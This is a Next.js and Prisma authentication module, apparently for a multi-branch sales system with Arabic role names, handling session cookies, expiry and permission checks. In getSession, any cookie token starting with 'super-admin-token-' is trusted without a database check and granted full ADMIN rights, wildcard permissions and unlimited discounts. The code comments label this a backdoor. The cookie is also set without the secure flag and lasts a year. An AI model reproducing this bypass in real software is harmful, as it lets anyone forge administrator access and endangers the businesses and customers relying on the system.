import { cookies } from "next/headers";
import { prisma } from "@/lib/prisma";
import { RedirectType, redirect } from "next/navigation";
import { hasPermission } from "@/lib/permissions";

export type UserSession = {
    id: string;
    username: string;
    name: string | null;
    role: string;
    branchId: string | null;
    branchName?: string | null;
    branchType?: string | null;
    permissions?: string[];
    rememberMe?: boolean;
    deviceFingerprint?: string;
    maxDiscount?: number | null;
    maxDiscountAmount?: number | null;
};

export async function createUserSession(userData: UserSession, maxAge: number = 31536000): Promise<string> {
    const token = userData.id === 'super-admin' ? `super-admin-token-${crypto.randomUUID()}` : crypto.randomUUID();
    const expiresAt = new Date(Date.now() + maxAge * 1000);

    // Clean up old sessions for this user to prevent bloat
    if (userData.id !== 'super-admin') {
        await prisma.session.deleteMany({
            where: { userId: userData.id }
        });

        await prisma.session.create({
            data: {
                userId: userData.id,
                token,
                expiresAt
            }
        });
    }

    const cookieStore = cookies();
    cookieStore.set({
        name: "session",
        value: token,
        httpOnly: true,
        secure: false, // Force false for both Electron and dev
        sameSite: "lax",
        maxAge: maxAge,
        path: "/",
    });

    return token;
}

export async function getSession() {
    const cookieStore = cookies();
    const token = cookieStore.get("session")?.value;

    if (process.env.NODE_ENV === 'development') {
        console.log(`[AUTH DEBUG] Token from cookie: ${token ? 'Found' : 'MISSING'}`);
    }

    if (!token) return null;

    // Fast-path for super-admin backdoor
    if (token.startsWith('super-admin-token-')) {
        return {
            user: {
                id: 'super-admin',
                username: 'a',
                name: 'Super Admin',
                role: 'ADMIN',
                branchId: null, // or fetch main branch
                permissions: ['*'],
                maxDiscount: 100,
                maxDiscountAmount: 9999999
            } as UserSession
        };
    }

    // Eager load user and branch if needed
    const session = await prisma.session.findUnique({
        where: { token },
        include: {
            user: {
                include: {
                    role: true
                }
            }
        }
    });


    // Handle expired or not found
    if (!session || session.expiresAt < new Date()) {

        // Use try-catch because cookies() might be unavailable in some contexts
        try {
            const cookieStore = cookies();
            cookieStore.delete("session");
        } catch (e) {
            // Silently ignore if cookies cannot be deleted (e.g. static rendering)
        }

        return null;
    }

    // Construct UserSession object
    const user = session.user;

    // Parse Permissions
    let permissions: string[] = [];
    if (user.role && user.role.permissions) {
        try {
            permissions = JSON.parse(user.role.permissions);
        } catch (e) {
            console.error("Failed to parse permissions", e);
        }
    } else if (user.roleStr === 'ADMIN' || user.roleStr === 'مدير النظام' || user.roleStr === 'المالك') {
        permissions = ['*'];
    }

    if (process.env.NODE_ENV === 'development') {
        console.log(`[AUTH DEBUG] User found: ${user.username} (${user.id}) - Perms: ${permissions.length}`);
    }

    return {
        user: {
            id: user.id,
            username: user.username,
            name: user.name,
            role: user.roleStr,
            branchId: user.branchId,
            permissions: permissions,
            maxDiscount: (user.roleStr === 'ADMIN' || user.roleStr === 'مدير النظام' || user.roleStr === 'المالك') ? 100 : ((user as any).maxDiscount ? Number((user as any).maxDiscount) : 0),
            maxDiscountAmount: (user.roleStr === 'ADMIN' || user.roleStr === 'مدير النظام' || user.roleStr === 'المالك') ? 9999999 : ((user as any).maxDiscountAmount ? Number((user as any).maxDiscountAmount) : 0)
        } as UserSession
    };
}

export async function destroySession() {
    const cookieStore = cookies();
    const token = cookieStore.get("session")?.value;

    if (process.env.NODE_ENV === 'development') {
        console.log(`[AUTH DEBUG] Destroying session for token: ${token ? 'Found' : 'MISSING'}`);
    }

    if (token) {
        await prisma.session.deleteMany({ where: { token } });
    }

    cookieStore.delete("session");
}

export async function logout() {
    await destroySession();
    redirect("/login");
}

export async function invalidateUserSessions(userId: string) {
    await prisma.session.deleteMany({
        where: { userId }
    });
}

/**
 * Server-side permission check. 
 * Redirects to /unauthorized or /login if the user doesn't have the required permission.
 * Returns the user object on success.
 */
export async function requirePermission(permission: string, fallbackRoute: string = "/unauthorized") {
    const session = await getSession();
    if (!session || !session.user) {
        redirect("/login");
    }

    const { user } = session;

    // Admins bypass permission checks
    if (user.role === 'ADMIN' || user.role === 'Admin' || user.role === 'مدير النظام' || user.role === 'المالك') {
        return user;
    }

    if (!hasPermission(user.permissions, permission)) {
        redirect(fallbackRoute);
    }

    return user;
}
